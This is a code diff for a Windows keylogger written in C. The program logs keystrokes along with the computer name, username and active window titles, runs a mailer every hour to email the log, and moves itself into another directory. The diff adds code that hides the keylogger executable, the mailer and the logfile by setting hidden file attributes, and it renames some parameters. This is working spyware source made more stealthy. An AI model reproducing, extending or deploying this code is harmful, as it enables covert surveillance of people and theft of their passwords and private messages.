@@ -6,15 +6,15 @@
 #include <process.h>
 
 // GLOBALS //
-#define BUF_SIZE 256 // general purpose for buffers
+#define BUF_SIZE 256   // general purpose for buffers
 #define LOG_TIMER 3600 // time limit until send email (3600s == 1 hour)
 
 // FUNCTION DECLARATIONS //
 void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory);
 char* GetTime();
 void HideWindow();
-void InitLogfile(char* filename);
-int GetLogfileLength(char* filename);
+void InitLogfile(char* logfile_path);
+int GetLogfileLength(char* logfile_path);
 void GetCurrentWindow(char* window, char* new_window, FILE* logfile);
 void ExecuteMailer(char* mailer_path, char* directory);
 void KeystrokeHandler(short key, FILE* logfile);
@@ -125,6 +125,7 @@ void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory){
 
         // if moved successfully, update file paths and make logfile
         if(moved2){
+            strncpy(keylogger_path, keylogger_new_path, MAX_PATH);
             strncpy(mailer_path, mailer_new_path, MAX_PATH);
             strncpy(logfile_path, logfile_new_path, MAX_PATH);
             strncpy(directory, new_directory, MAX_PATH);
@@ -136,6 +137,10 @@ void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory){
             InitLogfile(logfile_path);
         }
     }
+
+    // hide the executables
+    SetFileAttributes(keylogger_path, FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes(mailer_path, FILE_ATTRIBUTE_HIDDEN);
 }
 
 // get current time
@@ -153,7 +158,7 @@ void HideWindow(){
 }
 
 // initialize logfile filename and header
-void InitLogfile(char* filename){
+void InitLogfile(char* logfile_path){
     DWORD len = BUF_SIZE+1;
     
     // get current computer's name
@@ -170,7 +175,9 @@ void InitLogfile(char* filename){
     GetWindowText(foreground, window, BUF_SIZE);
 
     // open clean logfile and print out header
-    FILE* logfile = fopen(filename, "w");
+    SetFileAttributes(logfile_path, FILE_ATTRIBUTE_NORMAL); // unhide for proper clearing
+    FILE* logfile = fopen(logfile_path, "w");
+    SetFileAttributes(logfile_path, FILE_ATTRIBUTE_HIDDEN); // rehide
     fprintf(logfile, "COMPUTER: %s\nUSERNAME: %s\n", computername, username);
     fprintf(logfile, "WINDOW: %s\nTIME: %s", window, GetTime());
     fflush(logfile);
@@ -178,9 +185,9 @@ void InitLogfile(char* filename){
 }
 
 // gets the length of the logfile
-int GetLogfileLength(char* filename){
+int GetLogfileLength(char* logfile_path){
     int lines = 0;
-    FILE* logfile = fopen(filename, "r");
+    FILE* logfile = fopen(logfile_path, "r");
     while(!feof(logfile)){
         if(fgetc(logfile) == '\n'){ 
             lines++; 
@@ -200,7 +207,6 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
 
         // if changed/updated, display current window and time
         if(!strcmp(window, new_window) && strcmp(window, "")){
-            //keystroke_count+=100; // account for avg length of header
             fprintf(logfile, "\n\nWINDOW: %s\nTIME: %sKEYSTROKES: ", new_window, GetTime());
             fflush(logfile);
         }
